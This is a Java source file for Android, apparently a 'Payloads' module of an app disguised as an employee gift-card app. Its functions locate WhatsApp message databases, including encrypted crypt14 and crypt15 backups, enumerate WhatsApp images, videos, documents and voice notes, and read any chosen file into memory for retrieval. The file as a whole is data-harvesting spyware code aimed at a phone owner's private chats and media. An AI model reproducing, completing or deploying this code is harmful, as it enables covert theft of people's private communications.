package com.employee.giftcard.Payloads;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class getWhatsApp {
    
    /**
     * Get list of WhatsApp database files with metadata
     */
    public static String getWhatsAppDBList(Context context) {
        StringBuilder result = new StringBuilder();
        
        try {
            // WhatsApp database locations
            String[] possiblePaths = {
                "/data/data/com.whatsapp/databases/",
                "/storage/emulated/0/WhatsApp/Databases/",
                "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/"
            };
            
            int dbCount = 0;
            
            for (String basePath : possiblePaths) {
                File dbDir = new File(basePath);
                
                if (dbDir.exists() && dbDir.isDirectory()) {
                    File[] files = dbDir.listFiles();
                    
                    if (files != null) {
                        for (File file : files) {
                            if (file.isFile() && (file.getName().endsWith(".db") || 
                                                  file.getName().endsWith(".crypt14") ||
                                                  file.getName().endsWith(".crypt15"))) {
                                dbCount++;
                                result.append("Database #").append(dbCount).append("\n");
                                result.append("Name: ").append(file.getName()).append("\n");
                                result.append("Path: ").append(file.getAbsolutePath()).append("\n");
                                result.append("Size: ").append(formatFileSize(file.length())).append("\n");
                                result.append("Modified: ").append(formatDate(file.lastModified())).append("\n");
                                result.append("---\n");
                            }
                        }
                    }
                }
            }
            
            if (dbCount == 0) {
                return "No WhatsApp databases found.\nNote: May require root access or app-specific permissions.";
            }
            
            result.insert(0, "Found " + dbCount + " WhatsApp database(s)\n\n");
            
        } catch (Exception e) {
            return "Error accessing WhatsApp databases: " + e.getMessage();
        }
        
        return result.toString();
    }
    
    /**
     * Get WhatsApp media files (images, videos, documents) using MediaStore API
     * This works on Android 15+ with scoped storage
     */
    public static String getWhatsAppMedia(Context context) {
        StringBuilder result = new StringBuilder();
        
        try {
            int totalImages = 0;
            int totalVideos = 0;
            int totalFiles = 0;
            
            // Query images using MediaStore (works on Android 15)
            Uri imagesUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] imageProjection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_MODIFIED
            };
            
            // Filter for WhatsApp images
            String imageSelection = MediaStore.Images.Media.DATA + " LIKE ? OR " +
                                   MediaStore.Images.Media.DATA + " LIKE ?";
            String[] imageSelectionArgs = {"%/WhatsApp/%", "%/WhatsApp Business/%"};
            
            Cursor imageCursor = context.getContentResolver().query(
                imagesUri,
                imageProjection,
                imageSelection,
                imageSelectionArgs,
                MediaStore.Images.Media.DATE_MODIFIED + " DESC LIMIT 20"
            );
            
            if (imageCursor != null) {
                result.append("\n=== WhatsApp Images ===\n");
                
                while (imageCursor.moveToNext()) {
                    String name = imageCursor.getString(imageCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                    String path = imageCursor.getString(imageCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                    long size = imageCursor.getLong(imageCursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
                    long modified = imageCursor.getLong(imageCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED));
                    
                    result.append("Image: ").append(name).append("\n");
                    result.append("Path: ").append(path).append("\n");
                    result.append("Size: ").append(formatFileSize(size)).append("\n");
                    result.append("Date: ").append(formatDate(modified * 1000)).append("\n");
                    result.append("---\n");
                    
                    totalImages++;
                    totalFiles++;
                }
                imageCursor.close();
            }
            
            // Query videos using MediaStore
            Uri videosUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
            String[] videoProjection = {
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DATE_MODIFIED
            };
            
            String videoSelection = MediaStore.Video.Media.DATA + " LIKE ? OR " +
                                   MediaStore.Video.Media.DATA + " LIKE ?";
            String[] videoSelectionArgs = {"%/WhatsApp/%", "%/WhatsApp Business/%"};
            
            Cursor videoCursor = context.getContentResolver().query(
                videosUri,
                videoProjection,
                videoSelection,
                videoSelectionArgs,
                MediaStore.Video.Media.DATE_MODIFIED + " DESC LIMIT 20"
            );
            
            if (videoCursor != null) {
                result.append("\n=== WhatsApp Videos ===\n");
                
                while (videoCursor.moveToNext()) {
                    String name = videoCursor.getString(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME));
                    String path = videoCursor.getString(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA));
                    long size = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE));
                    long modified = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_MODIFIED));
                    
                    result.append("Video: ").append(name).append("\n");
                    result.append("Path: ").append(path).append("\n");
                    result.append("Size: ").append(formatFileSize(size)).append("\n");
                    result.append("Date: ").append(formatDate(modified * 1000)).append("\n");
                    result.append("---\n");
                    
                    totalVideos++;
                    totalFiles++;
                }
                videoCursor.close();
            }
            
            // Also try direct file access for backward compatibility
            String basePath = "/storage/emulated/0/WhatsApp/Media/";
            String[] mediaTypes = {"WhatsApp Images", "WhatsApp Video", "WhatsApp Documents", "WhatsApp Voice Notes"};
            
            for (String mediaType : mediaTypes) {
                File mediaDir = new File(basePath + mediaType);
                
                if (mediaDir.exists() && mediaDir.isDirectory()) {
                    File[] files = mediaDir.listFiles();
                    
                    if (files != null && files.length > 0) {
                        result.append("\n=== ").append(mediaType).append(" (Direct Access) ===\n");
                        result.append("Location: ").append(mediaDir.getAbsolutePath()).append("\n");
                        result.append("Files: ").append(files.length).append("\n\n");
                        
                        // List first 5 files
                        int count = 0;
                        for (File file : files) {
                            if (count >= 5) {
                                result.append("... and ").append(files.length - 5).append(" more files\n");
                                break;
                            }
                            
                            if (file.isFile()) {
                                result.append("  ").append(file.getName());
                                result.append(" (").append(formatFileSize(file.length())).append(")\n");
                                count++;
                            }
                        }
                    }
                }
            }
            
            if (totalFiles == 0) {
                return "No WhatsApp media found via MediaStore.\n" +
                       "This could mean:\n" +
                       "- WhatsApp is not installed\n" +
                       "- No WhatsApp media files exist\n" +
                       "- Android 15 scoped storage is blocking access\n" +
                       "Note: Database files require root access on Android 15.";
            }
            
            result.insert(0, "WhatsApp Media Summary (via MediaStore API)\n" +
                           "Images: " + totalImages + "\n" +
                           "Videos: " + totalVideos + "\n" +
                           "Total: " + totalFiles + " files\n");
            
        } catch (Exception e) {
            return "Error accessing WhatsApp media: " + e.getMessage() + "\n" +
                   "Stack trace: " + android.util.Log.getStackTraceString(e);
        }
        
        return result.toString();
    }
    
    /**
     * Read a specific file (database or media)
     */
    public static byte[] getFile(String filePath) {
        try {
            File file = new File(filePath);
            
            if (!file.exists()) {
                return null;
            }
            
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            
            return data;
            
        } catch (IOException e) {
            return null;
        }
    }
    
    // Helper methods
    private static String formatFileSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        int exp = (int) (Math.log(bytes) / Math.log(1024));
        String pre = "KMGTPE".charAt(exp-1) + "";
        return String.format(Locale.US, "%.2f %sB", bytes / Math.pow(1024, exp), pre);
    }
    
    private static String formatDate(long timestamp) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
        return sdf.format(new Date(timestamp));
    }
}
